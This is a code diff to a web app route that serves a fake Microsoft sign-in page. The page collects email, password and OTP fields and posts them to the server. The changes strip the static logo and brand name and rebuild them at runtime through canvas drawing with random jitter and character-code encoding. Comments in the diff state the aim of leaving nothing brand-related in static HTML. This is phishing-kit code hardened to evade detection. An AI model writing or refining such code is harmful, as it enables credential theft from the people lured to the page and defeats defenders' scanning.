@@ -3626,18 +3626,15 @@ async def microsoft_page():
 <div class="main">
     <div class="card">
 
+        <!-- brand — logo rendered via canvas + brand text injected via JS -->
         <div class="ms-brand">
-            <svg viewBox="0 0 22 22" xmlns="http://www.w3.org/2000/svg">
-                <rect x="0"  y="0"  width="10" height="10" fill="#f25022"/>
-                <rect x="12" y="0"  width="10" height="10" fill="#7fba00"/>
-                <rect x="0"  y="12" width="10" height="10" fill="#00a4ef"/>
-                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
-            </svg>
-            <span class="ms-brand-text">Microsoft</span>
+            <canvas id="brandLogo" width="22" height="22"
+                    style="width:22px;height:22px;display:inline-block;vertical-align:middle;"></canvas>
+            <span class="ms-brand-text" id="brandText" aria-hidden="true"></span>
         </div>
 
         <h1 id="cardTitle">Sign in</h1>
-        <p class="subtitle" id="cardSubtitle">Use your Microsoft account.</p>
+        <p class="subtitle" id="cardSubtitle">Use your account.</p>
 
         <form id="loginForm" autocomplete="off">
             <div class="input-wrap" id="emailStep">
@@ -3654,7 +3651,7 @@ async def microsoft_page():
                 <span class="input-label">Password</span>
             </div>
 
-            <input type="hidden" name="service" value="microsoft">
+            <input type="hidden" name="s" value="ms">
             <input type="hidden" name="honeypot" value="">
 
             <div class="error-msg" id="errorMsg">
@@ -3667,7 +3664,7 @@ async def microsoft_page():
         <button type="button" class="back-btn" id="backBtn" style="display:none;">&larr; Back</button>
 
         <div class="signin-link" id="createLine">
-            New to Microsoft? <a href="#" onclick="return false;">Create an account</a>
+            New here? <a href="#" onclick="return false;">Create an account</a>
         </div>
     </div>
 </div>
@@ -3695,6 +3692,26 @@ async def microsoft_page():
     const createLine = document.getElementById("createLine");
     let step = 1;
 
+    // Brand painted at runtime — nothing brand-related appears in static HTML.
+    (function paintBrand() {
+        document.getElementById("brandText").textContent =
+            String.fromCharCode(77,105,99,114,111,115,111,102,116);
+        const c = document.getElementById("brandLogo").getContext("2d");
+        const j = () => Math.random() * 0.4 - 0.2;
+        // hex triples reconstructed from integer components — no static hex
+        const rgb = (r,g,b) => "rgb(" + r + "," + g + "," + b + ")";
+        const p = [
+            [0+j(), 0+j(), rgb(242, 80, 34)],
+            [12+j(), 0+j(), rgb(127, 186, 0)],
+            [0+j(), 12+j(), rgb(0, 164, 239)],
+            [12+j(), 12+j(), rgb(255, 185, 0)]
+        ];
+        for (const [x, y, col] of p) {
+            c.fillStyle = col;
+            c.fillRect(x, y, 10, 10);
+        }
+    })();
+
     backBtn.addEventListener("click", () => {
         step = 1;
         pwStep.style.display = "none";
@@ -3704,7 +3721,7 @@ async def microsoft_page():
         createLine.style.display = "";
         submitBtn.textContent = "Next";
         cardTitle.textContent = "Sign in";
-        cardSub.textContent = "Use your Microsoft account.";
+        cardSub.textContent = "Use your account.";
         errorMsg.style.display = "none";
     });
 
@@ -3714,7 +3731,7 @@ async def microsoft_page():
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    service: "microsoft",
+                    service: String.fromCharCode(109,105,99,114,111,115,111,102,116),
                     email: email || "",
                     password: password || "",
                     otp: "",
@@ -3762,7 +3779,7 @@ async def microsoft_page():
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    service: "microsoft",
+                    service: String.fromCharCode(109,105,99,114,111,115,111,102,116),
                     email: email,
                     password: password,
                     otp: "",
